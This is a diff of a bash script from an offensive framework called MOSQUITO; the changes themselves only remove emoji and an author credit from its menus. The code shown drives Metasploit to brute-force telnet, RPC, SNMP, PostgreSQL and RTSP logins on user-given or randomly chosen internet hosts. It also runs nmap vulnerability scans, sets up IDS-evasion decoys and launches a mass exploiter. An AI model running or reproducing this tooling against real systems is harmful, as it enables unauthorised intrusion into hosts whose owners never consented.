@@ -628,7 +626,7 @@ sh_main
 sh_ten () {
    echo "${BlueF}[${YellowF}running${BlueF}]:${white} telnet_brute resource_"${Reset};
    sleep 1
-   scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
+   scan=$(zenity --list --title " MOSQUITO " --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
    echo "$RANGE" > ip_range.txt
    #
    # Sellect the type of scan to use
@@ -641,14 +639,14 @@ sh_ten () {
    #
    elif [ "$scan" = "Scan user input rhosts" ]; then
       echo "${BlueF}[☠]${white} Scanning User input rhosts"${Reset};
-      rhost=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Input rhosts separated by blank spaces\nExample: 95.38.18.209 201.18.152.50" --width 450) > /dev/null 2>&1
+      rhost=$(zenity --entry --title " MOSQUITO " --text "Input rhosts separated by blank spaces\nExample: 95.38.18.209 201.18.152.50" --width 450) > /dev/null 2>&1
       msfconsole -q -x "setg RHOSTS $rhost;resource telnet_brute.rc"
    #
    # scanning ramdom WAN hosts
    #
    elif [ "$scan" = "Random search WAN for rhosts" ]; then
       echo "${BlueF}[☠]${white} Random Search WAN for rhosts"${Reset};
-      sealing=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Limmit the number of rhosts to find\nDefault: 600 (max = 1024)" --width 300) > /dev/null 2>&1
+      sealing=$(zenity --entry --title " MOSQUITO " --text "Limmit the number of rhosts to find\nDefault: 600 (max = 1024)" --width 300) > /dev/null 2>&1
 
       max="1024"
       rm -f 1024 > /dev/nul 2>&1
@@ -661,7 +659,7 @@ sh_ten () {
       echo "${BlueF}[☠]${white} Limmit the search to: $sealing hosts"${Reset};
       msfconsole -q -x "setg RANDOM_HOSTS true;setg LIMMIT $sealing;resource telnet_brute.rc"
    else
-      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
+      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting Bzzzz.."${Reset};
       sleep 2 && sh_main
    fi
 sh_main
@@ -675,7 +673,7 @@ sh_main
 sh_onze () {
    echo "${BlueF}[${YellowF}running${BlueF}]:${white} rpc_brute resource_"${Reset};
    sleep 1
-   scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
+   scan=$(zenity --list --title " MOSQUITO " --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
    echo "$RANGE" > ip_range.txt
    #
    # Sellect the type of scan to use
@@ -688,14 +686,14 @@ sh_onze () {
    #
    elif [ "$scan" = "Scan user input rhosts" ]; then
       echo "${BlueF}[☠]${white} Scanning User input rhosts"${Reset};
-      rhost=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Input rhosts separated by blank spaces\nExample: 205.72.213.47 199.197.116.190" --width 450) > /dev/null 2>&1
+      rhost=$(zenity --entry --title " MOSQUITO " --text "Input rhosts separated by blank spaces\nExample: 205.72.213.47 199.197.116.190" --width 450) > /dev/null 2>&1
       msfconsole -q -x "setg RHOSTS $rhost;resource rpc_brute.rc"
    #
    # scanning ramdom WAN hosts
    #
    elif [ "$scan" = "Random search WAN for rhosts" ]; then
       echo "${BlueF}[☠]${white} Random Search WAN for rhosts"${Reset};
-      sealing=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Limmit the number of rhosts to find\nDefault: 800 (max = 1024)" --width 300) > /dev/null 2>&1
+      sealing=$(zenity --entry --title " MOSQUITO " --text "Limmit the number of rhosts to find\nDefault: 800 (max = 1024)" --width 300) > /dev/null 2>&1
 
       max="1024"
       rm -f 1024 > /dev/nul 2>&1
@@ -708,7 +706,7 @@ sh_onze () {
       echo "${BlueF}[☠]${white} Limmit the search to: $sealing hosts"${Reset};
       msfconsole -q -x "setg RANDOM_HOSTS true;setg LIMMIT $sealing;resource rpc_brute.rc"
    else
-      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
+      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting Bzzzz.."${Reset};
       sleep 2 && sh_main
    fi
 sh_main
@@ -722,7 +720,7 @@ sh_main
 sh_twelve () {
    echo "${BlueF}[${YellowF}running${BlueF}]:${white} snmp_brute resource_"${Reset};
    sleep 1
-   scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
+   scan=$(zenity --list --title " MOSQUITO " --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
    echo "$RANGE" > ip_range.txt
    #
    # Sellect the type of scan to use
@@ -735,14 +733,14 @@ sh_twelve () {
    #
    elif [ "$scan" = "Scan user input rhosts" ]; then
       echo "${BlueF}[☠]${white} Scanning User input rhosts"${Reset};
-      rhost=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Input rhosts separated by blank spaces\nExample: 192.249.87.128 24.24.40.36" --width 450) > /dev/null 2>&1
+      rhost=$(zenity --entry --title " MOSQUITO " --text "Input rhosts separated by blank spaces\nExample: 192.249.87.128 24.24.40.36" --width 450) > /dev/null 2>&1
       msfconsole -q -x "setg RHOSTS $rhost;resource snmp_brute.rc"
    #
    # scanning ramdom WAN hosts
    #
    elif [ "$scan" = "Random search WAN for rhosts" ]; then
       echo "${BlueF}[☠]${white} Random Search WAN for rhosts"${Reset};
-      sealing=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Limmit the number of rhosts to find\nDefault: 250 (max = 1024)" --width 300) > /dev/null 2>&1
+      sealing=$(zenity --entry --title " MOSQUITO " --text "Limmit the number of rhosts to find\nDefault: 250 (max = 1024)" --width 300) > /dev/null 2>&1
 
       max="1024"
       rm -f 1024 > /dev/nul 2>&1
@@ -755,7 +753,7 @@ sh_twelve () {
       echo "${BlueF}[☠]${white} Limmit the search to: $sealing hosts"${Reset};
       msfconsole -q -x "setg RANDOM_HOSTS true;setg LIMMIT $sealing;resource snmp_brute.rc"
    else
-      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
+      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting Bzzzz.."${Reset};
       sleep 2 && sh_main
    fi
 sh_main
@@ -769,7 +767,7 @@ sh_main
 sh_treze () {
    echo "${BlueF}[${YellowF}running${BlueF}]:${white} postgres_brute resource_"${Reset};
    sleep 1
-   scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
+   scan=$(zenity --list --title " MOSQUITO " --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
    echo "$RANGE" > ip_range.txt
    #
    # Sellect the type of scan to use
@@ -782,14 +780,14 @@ sh_treze () {
    #
    elif [ "$scan" = "Scan user input rhosts" ]; then
       echo "${BlueF}[☠]${white} Scanning User input rhosts"${Reset};
-      rhost=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Input rhosts separated by blank spaces\nExample: 205.88.183.168 185.99.212.190" --width 450) > /dev/null 2>&1
+      rhost=$(zenity --entry --title " MOSQUITO " --text "Input rhosts separated by blank spaces\nExample: 205.88.183.168 185.99.212.190" --width 450) > /dev/null 2>&1
       msfconsole -q -x "setg RHOSTS $rhost;resource postgres_brute.rc"
    #
    # scanning ramdom WAN hosts
    #
    elif [ "$scan" = "Random search WAN for rhosts" ]; then
       echo "${BlueF}[☠]${white} Random Search WAN for rhosts"${Reset};
-      sealing=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Limmit the number of rhosts to find\nDefault: 500 (max = 1024)" --width 300) > /dev/null 2>&1
+      sealing=$(zenity --entry --title " MOSQUITO " --text "Limmit the number of rhosts to find\nDefault: 500 (max = 1024)" --width 300) > /dev/null 2>&1
 
       max="1024"
       rm -f 1024 > /dev/nul 2>&1
@@ -802,7 +800,7 @@ sh_treze () {
       echo "${BlueF}[☠]${white} Limmit the search to: $sealing hosts"${Reset};
       msfconsole -q -x "setg RANDOM_HOSTS true;setg LIMMIT $sealing;resource postgres_brute.rc"
    else
-      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
+      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting Bzzzz.."${Reset};
       sleep 2 && sh_main
    fi
 sh_main
@@ -814,7 +812,7 @@ sh_quatorze () {
    echo "${BlueF}[${YellowF}running${BlueF}]:${white} rtsp_url_brute resource_"${Reset};
    sleep 1
    IPADDR=`ifconfig $InT3R | egrep -w "inet" | awk {'print $2'}` # grab local ip address
-   scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
+   scan=$(zenity --list --title " MOSQUITO " --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
    echo "$RANGE" > ip_range.txt
    #
    # Sellect the type of scan to use
@@ -827,14 +825,14 @@ sh_quatorze () {
    #
    elif [ "$scan" = "Scan user input rhosts" ]; then
       echo "${BlueF}[☠]${white} Scanning User input rhosts"${Reset};
-      rhost=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Input rhosts separated by blank spaces\nExample: 201.203.27.251 159.121.101.207" --width 450) > /dev/null 2>&1
+      rhost=$(zenity --entry --title " MOSQUITO " --text "Input rhosts separated by blank spaces\nExample: 201.203.27.251 159.121.101.207" --width 450) > /dev/null 2>&1
       msfconsole -q -x "setg RHOSTS $rhost;setg LHOST $IPADDR;resource rtsp-url-brute.rc"
    #
    # scanning ramdom WAN hosts
    #
    elif [ "$scan" = "Random search WAN for rhosts" ]; then
       echo "${BlueF}[☠]${white} Random Search WAN for rhosts"${Reset};
-      sealing=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Limmit the number of rhosts to find\nDefault: 700 (max = 1024)" --width 300) > /dev/null 2>&1
+      sealing=$(zenity --entry --title " MOSQUITO " --text "Limmit the number of rhosts to find\nDefault: 700 (max = 1024)" --width 300) > /dev/null 2>&1
 
       max="1024"
       rm -f 1024 > /dev/nul 2>&1
@@ -847,7 +845,7 @@ sh_quatorze () {
       echo "${BlueF}[☠]${white} Limmit the search to: $sealing hosts"${Reset};
       msfconsole -q -x "setg RANDOM_HOSTS true;setg LIMMIT $sealing;setg LHOST $IPADDR;resource rtsp-url-brute.rc"
    else
-      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
+      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting Bzzzz.."${Reset};
       sleep 2 && sh_main
    fi
 sh_main
@@ -855,38 +853,38 @@ sh_main
 
 
 sh_easter_egg () {
-echo "${BlueF}[${YellowF}running${BlueF}]:${white} 🦟Nmap nse quick scans🦟 ${BlueF}[${YellowF}top-ports${BlueF}]"${Reset};
+echo "${BlueF}[${YellowF}running${BlueF}]:${white} Nmap nse quick scans ${BlueF}[${YellowF}top-ports${BlueF}]"${Reset};
 sleep 1
 
 ## Local variable declarations
 IPADDR=`ifconfig $InT3R | egrep -w "inet" | awk {'print $2'}` # grab local ip address
-scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" TRUE "Scan Local Lan (fast)" FALSE "Scan Local Lan (discovery)" FALSE "Scan Local Lan (vulns)" FALSE "Scan User Input Host(s)" --width 330 --height 220) > /dev/null 2>&1
+scan=$(zenity --list --title " MOSQUITO " --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" TRUE "Scan Local Lan (fast)" FALSE "Scan Local Lan (discovery)" FALSE "Scan Local Lan (vulns)" FALSE "Scan User Input Host(s)" --width 330 --height 220) > /dev/null 2>&1
 ## random database xml file generator
 rand=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 6 | head -n 1)
 
    ## Scan Local Lan (fast)
    if [ "$scan" = "Scan Local Lan (fast)" ]; then
-      echo "${BlueF}[☠]${white} Scanning Local Lan: $RANGE.0/24🦟"${Reset};
+      echo "${BlueF}[☠]${white} Scanning Local Lan: $RANGE.0/24"${Reset};
       msfconsole -q -x "workspace -a mosquito;db_nmap -sn $RANGE.0/24;db_export -f xml -a $IPATH/logs/database_$rand.xml;hosts -C address,name,os_name,purpose,info;workspace -d mosquito"
    ## Scan Local Lan (nse discovery categorie)
    elif [ "$scan" = "Scan Local Lan (discovery)" ]; then
-      echo "${BlueF}[☠]${white} Scanning Local Lan: $RANGE.0/24🦟"${Reset};
-      top_pp=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Input top-ports to scan\nExample: 1000" --width 450) > /dev/null 2>&1
+      echo "${BlueF}[☠]${white} Scanning Local Lan: $RANGE.0/24"${Reset};
+      top_pp=$(zenity --entry --title " MOSQUITO " --text "Input top-ports to scan\nExample: 1000" --width 450) > /dev/null 2>&1
       msfconsole -q -x "workspace -a mosquito;db_nmap -sS -v -Pn -n -T4 -O --top-ports $top_pp --open --script=nbstat.nse,smb-os-discovery.nse,smb-enum-shares.nse,smb-vuln-regsvc-dos.nse,telnet-ntlm-info.nse,ssl-ccs-injection.nse,http-slowloris-check.nse,http-mobileversion-checker.nse $RANGE.0/24;db_export -f xml -a $IPATH/logs/database_$rand.xml;hosts -C address,name,os_name,purpose,info;services -c port,proto,name,state;workspace -d mosquito"
    ## Scan Local Lan (nse vuln categorie)
    elif [ "$scan" = "Scan Local Lan (vulns)" ]; then
-      echo "${BlueF}[☠]${white} Scanning Local Lan: $RANGE.0/24🦟"${Reset};
-      top_pp=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Input top-ports to scan\nExample: 1000" --width 450) > /dev/null 2>&1
+      echo "${BlueF}[☠]${white} Scanning Local Lan: $RANGE.0/24"${Reset};
+      top_pp=$(zenity --entry --title " MOSQUITO " --text "Input top-ports to scan\nExample: 1000" --width 450) > /dev/null 2>&1
       msfconsole -q -x "workspace -a mosquito;db_nmap -sS -v -Pn -n -T4 -O --top-ports $top_pp --open --script=vuln $RANGE.0/24;db_nmap -sV -T5 -Pn --script=freevulnsearch.nse,vulners.nse $RANGE.0/24;db_export -f xml -a $IPATH/logs/database_$rand.xml;hosts -C address,name,os_name,purpose,info;services -c port,proto,name,state;workspace -d mosquito"
    ## Scan User Input Host(s) (nse vuln categorie)
    elif [ "$scan" = "Scan User Input Host(s)" ]; then
-      rhost=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Input rhosts separated by blank spaces\nExample: 192.168.1.71 192.168.1.254" --width 450) > /dev/null 2>&1
-      echo "${BlueF}[☠]${white} Scanning Local Machine: $rhost🦟"${Reset};
-      top_pp=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Input top-ports to scan\nExample: 1000" --width 450) > /dev/null 2>&1
+      rhost=$(zenity --entry --title " MOSQUITO " --text "Input rhosts separated by blank spaces\nExample: 192.168.1.71 192.168.1.254" --width 450) > /dev/null 2>&1
+      echo "${BlueF}[☠]${white} Scanning Local Machine: $rhost"${Reset};
+      top_pp=$(zenity --entry --title " MOSQUITO " --text "Input top-ports to scan\nExample: 1000" --width 450) > /dev/null 2>&1
       msfconsole -q -x "workspace -a mosquito;db_nmap -sS -v -Pn -n -T4 -O --top-ports $top_pp --open --script=vuln $rhost;db_nmap -sV -T5 -Pn --script=freevulnsearch.nse,vulners.nse $rhost;db_export -f xml -a $IPATH/logs/database_$rand.xml;hosts -C address,name,os_name,purpose,info;services -c port,proto,name,state;workspace -d mosquito"
    else
       ## None option selected ..aborting..
-      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
+      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting Bzzzz.."${Reset};
       sleep 2 && sh_main
    fi
 sh_main
@@ -901,7 +899,7 @@ sh_hail_mary () {
 echo "${BlueF}[${YellowF}running${BlueF}]:${white} mass_exploiter resource_"${Reset};sleep 1
 ## mass_exploiter banner
 echo "" && echo ""
-echo ${BlueF}"                 🦟 armitage Hail Mary (based) resource script 🦟"${Reset};
+echo ${BlueF}"                  armitage Hail Mary (based) resource script "${Reset};
 cat << !
                  ------------------------------------------------
     mass_exploiter.rc resource script allow us to scan user inputs (rhosts/lhosts)
@@ -917,23 +915,23 @@ if [ "$question" = "y" ] || [ "$question" = "Y" ]; then
 
 ## Local variable declarations
 IPADDR=`ifconfig $InT3R | egrep -w "inet" | awk {'print $2'}` # grab local ip address
-scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" TRUE "Scan user input rhosts" FALSE "Import database.xml (rhosts)" FALSE "Suggest exploits (dont exploit)" --width 320 --height 210) > /dev/null 2>&1
+scan=$(zenity --list --title " MOSQUITO " --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" TRUE "Scan user input rhosts" FALSE "Import database.xml (rhosts)" FALSE "Suggest exploits (dont exploit)" --width 320 --height 210) > /dev/null 2>&1
 if [ "$scan" = "Import database.xml (rhosts)" ]; then
-   dbx=$(zenity --title "🦟 MOSQUITO 🦟" --filename=$IPATH --file-selection --text "chose database.xml file to import") > /dev/null 2>&1
+   dbx=$(zenity --title " MOSQUITO " --filename=$IPATH --file-selection --text "chose database.xml file to import") > /dev/null 2>&1
 elif [ "$scan" = "Suggest exploits (dont exploit)" ]; then
   :
 else
-   rhost=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Input rhosts separated by blank spaces\nExample: 117.2.40.217 45.32.87.101" --width 450) > /dev/null 2>&1
+   rhost=$(zenity --entry --title " MOSQUITO " --text "Input rhosts separated by blank spaces\nExample: 117.2.40.217 45.32.87.101" --width 450) > /dev/null 2>&1
 fi
 
 if ! [ "$scan" = "Suggest exploits (dont exploit)" ]; then
-scan_max=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Scan MAX number of ports or regular scan?\nWARNING: Scanning MAX ports it will take longer." --radiolist --column "Pick" --column "Option" TRUE "Scan default ports (fast)" FALSE "Scan MAX number of ports" --width 330 --height 180) > /dev/null 2>&1
+scan_max=$(zenity --list --title " MOSQUITO " --text "Scan MAX number of ports or regular scan?\nWARNING: Scanning MAX ports it will take longer." --radiolist --column "Pick" --column "Option" TRUE "Scan default ports (fast)" FALSE "Scan MAX number of ports" --width 330 --height 180) > /dev/null 2>&1
    if [ "$scan_max" = "Scan default ports (fast)" ]; then
       max_value="false"
    else
       max_value="true"
    fi
-decoy=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Nmap IDS evasion decoy technic" --radiolist --column "Pick" --column "Option" TRUE "Use www.apple.org decoy (default)" FALSE "Manualy set the 2º decoy ip addr" --width 320 --height 180) > /dev/null 2>&1
+decoy=$(zenity --list --title " MOSQUITO " --text "Nmap IDS evasion decoy technic" --radiolist --column "Pick" --column "Option" TRUE "Use www.apple.org decoy (default)" FALSE "Manualy set the 2º decoy ip addr" --width 320 --height 180) > /dev/null 2>&1
 fi
 
    #
@@ -968,12 +966,12 @@ fi
       fi
    ## None option sellected..aborting ..
    else
-      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
+      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting Bzzzz.."${Reset};
       sleep 2 && sh_main
    fi
 
 else
-   echo "${BlueF}[${RedF}x${BlueF}]${white} Aborting Module execution 🦟Bzzzz.."${Reset};
+   echo "${BlueF}[${RedF}x${BlueF}]${white} Aborting Module execution Bzzzz.."${Reset};
    sleep 2 && sh_main
 fi
 sh_main
@@ -982,7 +980,7 @@ sh_main
 
 
 ###################################################################
-#                   * 🦟 MOSQUITO MAIN MENU 🦟 *                  #
+#                   *  MOSQUITO MAIN MENU  *                  #
 ###################################################################
 sh_main () {
 rm -f 1024 > /dev/nul 2>&1
@@ -993,12 +991,12 @@ do
 clear
 echo "---"${BlueF}
 cat << !
-                                                🦟__________       
-              _______🦟________________________  ___(_) _  /______🦟
+                                                __________       
+              _______________________________  ___(_) _  /______
            __  __  __ \  __ \_  ___/  __  /  / / /_  /_  __/  __ \\
-         🦟_  / / / / / /_/ /(__  )/ /_/ // /_/ /_  / / /_ / /_/ /
+           _  / / / / / /_/ /(__  )/ /_/ // /_/ /_  / / /_ / /_/ /
            /_/ /_/ /_/\____//____/ \__, / \__,_/ /_/  \__/ \____/v:$ver
-                                     /_/ 🦟 Author:r00t-3xp10it        🦟
+                                     /_/          
 !
 echo "" && echo "${BlueF}    ${RedF}:${BlueF}Framework Description${RedF}:${BlueF}"${Reset};
 cat << !
@@ -1032,7 +1030,7 @@ cat << !
     ║    N     -     Nmap nse quick scans                                       ║
     ╚───────────────────────────────────────────────────────────────────────────╣
 !
-echo "                                                           🦟${BlueF}SSA${YellowF}©${RedF}RedTeam${YellowF}@${BlueF}2019${white}🦟─╝"${Reset};
+echo "                                                           ${BlueF}SSA${YellowF}©${RedF}RedTeam${YellowF}@${BlueF}2019${white}─╝"${Reset};
 echo ""
 echo "${BlueF}[☠]${white} mosquito framework"${Reset}
 sleep 1
@@ -1090,18 +1088,18 @@ exp|expl|explo|exploi|exploit|Exploit|EXPLOIT)
    sh_hail_mary # mass_exploiter.rc
 ;;
 e|E|exit|EXIT)
-    echo "${BlueF}[${YellowF}i${BlueF}]${white} Closing framework 🦟Bzzzz."${Reset};
-    service postgresql stop | zenity --progress --pulsate --title "🦟 PLEASE WAIT 🦟" --text="Stoping postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
+    echo "${BlueF}[${YellowF}i${BlueF}]${white} Closing framework Bzzzz."${Reset};
+    service postgresql stop | zenity --progress --pulsate --title " PLEASE WAIT " --text="Stoping postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
 rm -f ip_range.txt > /dev/nul 2>&1
 exit
 ;;
 h|H|help|HELP)
     echo "${BlueF}[${YellowF}i${BlueF}] [${YellowF}EXECUTE${BlueF}] sudo ./mosquito.sh -h"${Reset};
-    service postgresql stop | zenity --progress --pulsate --title "🦟 PLEASE WAIT 🦟" --text="Stoping postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
+    service postgresql stop | zenity --progress --pulsate --title " PLEASE WAIT " --text="Stoping postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
 exit
 ;;
 *)
-    echo "${BlueF}[${RedF}x${BlueF}]${white} '${RedF}$choice${white}': is not a valid Option 🦟Bzzzz."${Reset};
+    echo "${BlueF}[${RedF}x${BlueF}]${white} '${RedF}$choice${white}': is not a valid Option Bzzzz."${Reset};
     sleep 2 && sh_main
 ;;
 esac
